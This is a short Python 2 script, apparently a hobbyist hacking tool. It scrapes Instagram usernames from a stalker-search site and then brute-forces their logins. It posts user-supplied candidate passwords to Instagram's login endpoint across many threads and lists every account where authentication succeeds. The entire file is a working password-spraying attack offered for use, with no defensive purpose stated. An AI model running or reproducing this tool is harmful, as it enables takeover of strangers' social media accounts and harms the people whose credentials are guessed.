# Copyright 2019 By GreG

import requests,bs4,re,sys
from multiprocessing.pool import ThreadPool

pas=""
counts=""
count=0
found=[]

__author__={
		"name":"GreG",
		"follow_ig":"bianshabriansyah04",
		"facebok":"muhammad shabriansyah"
	}

print("\n\t[ Coded By %s ]\n"%
	((__author__["name"])))

def main(user):
	global pas,found,count,counts
	for i in pas:
		url='https://www.instagram.com'
		s=requests.Session()
		r=s.get(url)
		s.headers.update(
		{'X-CSRFToken' : r.cookies.get_dict()
		[
			'csrftoken'
		]})
		p = s.post(url+"/accounts/login/ajax/", 
		data=
			{
				'username':user,
				'password':i
			}, 
		allow_redirects=True)
		if (p.json()["authenticated"] == True):
			found.append("[+] %s|%s"%(user,i))
	count+=1
	print("\r[+] Cracking %s/%s: found-:%s"%(
		count,counts,len(found)
			)),;sys.stdout.flush()
	
def search():
	global pas,counts,found
	ss=[]
	url="https://insta-stalker.com/"
	bs=bs4.BeautifulSoup(
		requests.get(url+"search/?q="+raw_input(
			"query: ")).text,
	features="html.parser")
	print 
	for x in bs.find_all("a",href=True):
		if "/profile/" in x["href"]:
			s=re.findall("/profile/(.*?)/","%s"%(x["href"]))
			if s !=0:
				ss.append(s[0])
				print("%s. %s"%(len(ss),s[0]))
	if len(s) !=0:
		print("\n[+] %s result found."%(len(ss)))
		counts=len(ss)
		sd=raw_input('[?] bruteforce now?y/n): ')
		if sd.lower() =="y":
			print("[*] use coma (,) for another passwords")
			print("[*] Example: pas1,pas2,pass3")
			pas=raw_input("[?] password to crack: ").split(",")
			p=ThreadPool(input("[?] Threads: "))
			p.map(main,ss)
			if len(found) !=0:
				print("\n\n[F]ound: %s"%(len(found)))
				for x in found:
					print x
			else:
				print("\n[N]o Result Found :))")
		else:
			search()
	else:
		print("[-] no result found.")
		raw_input("press enter to again...")
		search()
		
search()